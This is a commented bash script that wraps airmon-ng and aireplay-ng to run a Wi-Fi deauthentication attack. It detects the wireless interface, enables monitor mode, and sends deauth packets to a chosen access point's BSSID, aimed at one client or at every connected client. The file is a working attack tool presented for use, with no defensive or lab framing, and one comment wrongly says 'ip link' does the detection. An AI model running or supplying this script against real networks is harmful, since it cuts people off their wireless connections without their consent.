#!/bin/bash

# Dynamically get the active wireless network interface
# The `ip link` command lists all network interfaces. We filter for wireless interfaces using `grep` and `awk`.
# This ensures the script automatically selects the wireless interface if the user doesn't specify one.
interface=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)

# Validate that a wireless interface was detected
if [ -z "$interface" ]; then
    echo "No wireless interface found. Please ensure your system has an active wireless interface or specify one using --interface."
    exit 1
fi

# Parse command-line arguments
# This section processes the options provided to the script.
# Supported options:
#   --interface <interface-name>: Allows the user to specify a custom wireless interface.
#   --deauth: Enables a deauthentication attack.
#   --bssid <BSSID>: Specifies the target BSSID for the deauth attack.
#   --client <MAC>: Specifies the target client MAC address for the deauth attack (optional).
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --interface) 
            # Assign the user-specified interface to the variable
            interface="$2"
            shift # Skip the next argument since it has been processed
            ;;
        --deauth) 
            # Enable deauthentication attack mode
            deauth=true 
            ;;
        --bssid) 
            # Capture the target BSSID for the attack
            bssid="$2"
            shift # Skip the next argument since it has been processed
            ;;
        --client) 
            # Capture the target client MAC address (optional)
            client="$2"
            shift # Skip the next argument since it has been processed
            ;;
        *) 
            # Handle unknown arguments and provide an error message
            echo "Unknown parameter: $1"
            echo "Usage: ./script.sh [--interface <interface-name>] [--deauth] [--bssid <BSSID>] [--client <MAC>]"
            exit 1
            ;;
    esac
    shift # Move to the next argument
done

# Perform a deauthentication attack if the --deauth flag is set
if [ "$deauth" = true ]; then
    # Ensure the BSSID parameter is provided
    if [ -z "$bssid" ]; then
        echo "Error: Please specify --bssid for the deauth attack."
        exit 1
    fi

    # Start monitor mode on the specified interface
    # The `airmon-ng start` command enables monitor mode on the wireless interface.
    echo "Starting monitor mode on interface: $interface"
    sudo airmon-ng start "$interface"

    # Append "mon" to the interface name to get the monitor mode interface
    mon_interface="${interface}mon"

    # Perform the deauthentication attack
    # The `aireplay-ng` tool is used to send deauthentication packets.
    # If the client MAC address is specified, target the specific client. Otherwise, target all clients.
    echo "Performing deauth attack on BSSID: $bssid"
    if [ -n "$client" ]; then
        echo "Targeting client: $client"
        sudo aireplay-ng --deauth 10 -a "$bssid" -c "$client" "$mon_interface"
    else
        echo "Targeting all clients connected to BSSID: $bssid"
        sudo aireplay-ng --deauth 10 -a "$bssid" "$mon_interface"
    fi

    # Stop monitor mode on the interface
    # The `airmon-ng stop` command disables monitor mode and restores the interface to its normal state.
    echo "Stopping monitor mode on interface: $mon_interface"
    sudo airmon-ng stop "$mon_interface"
fi
